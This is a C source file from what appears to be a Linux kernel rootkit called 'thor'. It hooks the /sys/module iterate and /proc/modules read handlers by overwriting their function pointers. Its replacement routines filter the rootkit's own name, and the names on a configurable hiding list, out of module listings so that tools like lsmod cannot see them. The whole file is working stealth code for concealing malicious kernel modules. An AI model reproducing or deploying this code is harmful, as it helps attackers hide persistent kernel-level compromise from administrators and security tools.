#include "lsmodhider.h"

#include "config.h"
#include "helper.h"
#include "logging.h"

#include <linux/fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/version.h>

/* function prototypes */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int thor_sysmodule_iterate(struct file *file, void *dirent, filldir_t filldir);
#else
static int thor_sysmodule_iterate(struct file *file, struct dir_context *ctx);
#endif
static int thor_sysmodule_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

ssize_t thor_procmodules_read(struct file *file, char __user *buf, size_t len, loff_t *off);

/* hiding list node */
struct _module_list {
    char *name;
    struct list_head list;
};

/* hiding list */
static struct _module_list module_list;

/* file operations on /sys/module */
static struct file_operations *sysmodule_fops;

/* file operations on /proc/modules */
static struct file_operations *procmodules_fops;

/* pointer to original /sys/module iterate function */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int (*orig_sysmodule_iterate)(struct file *file, void *dirent, filldir_t filldir);
#else
static int (*orig_sysmodule_iterate)(struct file *, struct dir_context *);
#endif

/* pointer to original /proc/modules read function */
ssize_t (*orig_procmodules_read) (struct file *, char __user *, size_t, loff_t *);

/* pointer to original /sys/module filldir function */
static int (*orig_sysmodule_filldir)(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

int lsmodhider_init(void)
{
    struct file *filep_sysmodule;
    struct file *filep_procmodules;
    void *sysmodule_iterate_addr;
    void *procmodules_read_addr;

    INIT_LIST_HEAD(&module_list.list);

    filep_sysmodule = filp_open("/sys/module", O_RDONLY, 0);
    if (filep_sysmodule == NULL) {
        LOG_ERROR("could not open /sys/module");
        return -1;
    }

    LOG_INFO("hooking /sys/module readdir / iterate");

    sysmodule_fops = (struct file_operations*) filep_sysmodule->f_op;
    filp_close(filep_sysmodule, NULL);

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    orig_sysmodule_iterate = sysmodule_fops->readdir;
#else
    orig_sysmodule_iterate = sysmodule_fops->iterate;
#endif
    sysmodule_iterate_addr = (void*) &thor_sysmodule_iterate;
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    write_no_prot(&sysmodule_fops->readdir, &sysmodule_iterate_addr, sizeof(void*));
#else
    write_no_prot(&sysmodule_fops->iterate, &sysmodule_iterate_addr, sizeof(void*));
#endif

    filep_procmodules = filp_open("/proc/modules", O_RDONLY, 0);
    if (filep_procmodules == NULL) {
        LOG_ERROR("could not open /proc/modules");
        return -1;
    }

    LOG_INFO("hooking /proc/modules read");

    procmodules_fops = (struct file_operations*) filep_procmodules->f_op;
    filp_close(filep_procmodules, NULL);

    orig_procmodules_read = procmodules_fops->read;

    procmodules_read_addr = (void*) &thor_procmodules_read;
    write_no_prot(&procmodules_fops->read, &procmodules_read_addr, sizeof(void*));

    return 0;
}

void lsmodhider_cleanup(void)
{

    if (sysmodule_fops != NULL && orig_sysmodule_iterate != NULL) {
         void *sysmodule_iterate_addr = orig_sysmodule_iterate;

        LOG_INFO("hooking /sys/module readdir / iterate");

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
        write_no_prot(&sysmodule_fops->readdir, &sysmodule_iterate_addr, sizeof(void*));
#else
        write_no_prot(&sysmodule_fops->iterate, &sysmodule_iterate_addr, sizeof(void*));
#endif
    }

    if (procmodules_fops != NULL && orig_procmodules_read != NULL) {
        void *procmodules_read_addr = orig_procmodules_read;
        LOG_INFO("hooking /proc/modules read");
        write_no_prot(&procmodules_fops->read, &procmodules_read_addr, sizeof(void*));
    }

    clear_module_list();
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int thor_sysmodule_iterate(struct file *file, void *dirent, filldir_t filldir)
{
    orig_sysmodule_filldir = filldir;
    return orig_sysmodule_iterate(file, dirent, thor_sysmodule_filldir);
}
#else
static int thor_sysmodule_iterate(struct file *file, struct dir_context *ctx)
{
    int ret;
    filldir_t *ctx_actor;

    /* capture original filldir function */
    orig_sysmodule_filldir = ctx->actor;

    /* cast away const from ctx->actor */
    ctx_actor = (filldir_t*)(&ctx->actor);

    /* store our filldir in ctx->actor */
    *ctx_actor = thor_sysmodule_filldir;
    ret = orig_sysmodule_iterate(file, ctx);

    /* restore original filldir */
    *ctx_actor = orig_sysmodule_filldir;

    return ret;
}
#endif

static int thor_sysmodule_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type)
{
    struct _module_list *tmp;

    /* hide thor */
    if (strcmp(name, THOR_MODULENAME) == 0) {
        LOG_INFO("hiding module %s", THOR_MODULENAME);
        return 0;
    }

    /* hide specified modules */
    list_for_each_entry(tmp, &(module_list.list), list) {
        if (strcmp(name, tmp->name) == 0) {
            LOG_INFO("hiding module %s", name);
            return 0;
        }
    }

    return orig_sysmodule_filldir(buf, name, namelen, offset, ino, d_type);
}

void my_hide_module(char __user *buf, char *module, size_t *len, ssize_t *read_ret)
{
    char *module_occ;

    /* find and hide module from /proc/modules */
    module_occ = strnstr(buf, module, *len);

    if (module_occ != NULL) { /* thor found */
        char *nl;
        /*
         * find newline and copy the rest of the buffer over the thor
         * occurrence
         */
        nl = strnstr(module_occ, "\n", *len - (module_occ - buf));
        memcpy(module_occ, nl+1, *len - ((nl + 1) - buf));
        *read_ret -= (nl+1 - module_occ);
        *len -= (nl+1 - module_occ);
    }
}

ssize_t thor_procmodules_read(struct file *file, char __user *buf, size_t len, loff_t *off)
{
    struct _module_list *tmp;
    ssize_t ret;

    ret = orig_procmodules_read(file, buf, len, off);

    /* hide thor */
    my_hide_module(buf, THOR_MODULENAME, &len, &ret);

    /* hide specified modules */
    list_for_each_entry(tmp, &(module_list.list), list) {
        my_hide_module(buf, tmp->name, &len, &ret);
    }

    return ret;
}

void add_to_module_list(const char *name, unsigned int len)
{
    struct _module_list *tmp;

    LOG_INFO("adding module %s from hiding list", name);

    tmp = (struct _module_list*) kmalloc(sizeof(struct _module_list), GFP_KERNEL);
    tmp->name = (char*) kmalloc(len, GFP_KERNEL);
    memcpy(tmp->name, name, len);
    tmp->name[len - 1] = 0;

    list_add(&(tmp->list), &(module_list.list));
}

void remove_from_module_list(const char *name, unsigned int len)
{
    struct _module_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(module_list.list)) {
        tmp = list_entry(pos, struct _module_list, list);
        if (strncmp(tmp->name, name, len - 1) == 0) {
            LOG_INFO("removing module %s from hiding list", name);
            list_del(pos);
            kfree(tmp->name);
            kfree(tmp);
        }
    }
}

void clear_module_list(void)
{
    struct _module_list *tmp;
    struct list_head *pos, *q;

    LOG_INFO("clearing module hiding list");

    list_for_each_safe(pos, q, &(module_list.list)) {
        tmp = list_entry(pos, struct _module_list, list);
        list_del(pos);
        kfree(tmp->name);
        kfree(tmp);
    }
}
